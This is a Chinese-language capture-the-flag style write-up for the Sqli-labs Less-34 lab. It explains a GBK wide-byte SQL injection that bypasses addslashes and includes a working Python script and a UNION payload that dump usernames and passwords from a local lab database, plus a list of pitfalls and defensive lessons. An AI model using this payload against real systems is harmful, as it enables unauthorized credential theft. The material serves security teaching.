## 题目：Sqli-labs Less-34 

## 题目描述
这关的名字叫 Bypass Add SLA...（Bypass Addslashes），而且页面变成了一个登录框，下面还有一个 Hint 专门回显输入的 Username 和 Password 被转义后的样子。

## 解题思路
1. 绕 addslashes：uname 送 \xdf'  →  \xdf\x5c\x27  →  GBK 吃掉 \x5c
2. 判列数： 只查 username, password  →  2 列
3. 放回显位： group_concat 放第 2 列，第 1 列用 0x78 占位
4. 收尾: `#` 注释掉后面的 and password='...'

## 解题步骤
**使用自动化脚本**
```text
# -*- coding: utf-8 -*-
import re
import requests

URL = "http://127.0.0.1/sqli-labs/Less-34/"

# 第 1 列给常量占位，第 2 列放要爆的数据（password 回显位）
payload = b"\xdf' union select 0x78,group_concat(username,0x3a,password) from users #"

# 用字节拼表单体，保证 0xDF 原样发出
data = b"uname=" + payload + b"&passwd=1&submit=Submit"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

r = requests.post(URL, data=data, headers=headers)

login  = re.search(rb"Your Login name:([^<]*)", r.content)
passwd = re.search(rb"Your Password:([^<]*)", r.content)

if passwd and b"admin:888888" in passwd.group(1):
    print("[+] 脱库成功：")
    print("    username =", login.group(1).decode())
    print("    password =", passwd.group(1).decode())
else:
    print("[-] 失败，检查：1) 是否 2 列  2) 是否发送了 0xDF 字节  3) 注释符 #")
    print(r.content[:300])
```

## 踩坑记录
1. union select 写 3 列
  * 现象: 页面空白，也没有报错
  * 原因: SELECT username, password 只有 2 列
  * 正解：union select 1,2

2. 用 "Dumb" in r.text 判断成功
   * 现象:  脚本永远进失败分支
   * 原因: union 成功后回显是 Your Login name:1，不再是 Dumb
   * 正解：  判 Your Password: 后是否出现数据

3. group_concat 放第 1 列
   * 现象: 数据被截断
   * 原因: 后面的 and password='1' 会拼到第 1 列
   * 正解：  放第 2 列，第 1 列用 0x78 占位

4. 发的是 %df 字面量
   * 现象: 反斜杠没被吃掉，注入失败
   * 原因:  PHP 收到的不是 0xDF 字节
   * 正解：  Python 用 b"\xdf"，requests 会自动编码成 %DF

5. 用 --+ 收尾
   * 现象: 注释偶尔失效
   * 原因:  表单里 + 可能变成 %2B
   * 正解：  用 #（%23）

## 知识点总结
1. 宽字节注入： addslashes 补的 \x5C 与 0xDF 组成 GBK 汉字，单引号逃逸
2. addslashes ≠ 安全，它不懂字符集；根治靠参数化查询
3. UNION 前提: 列数相同 + 回显位对齐
4. POST 注入: 和 GET 没本质区别，Burp Repeater / requests.post 一样打
5. 防御：预编译、统一 utf8mb4、关闭报错回显、最小权限
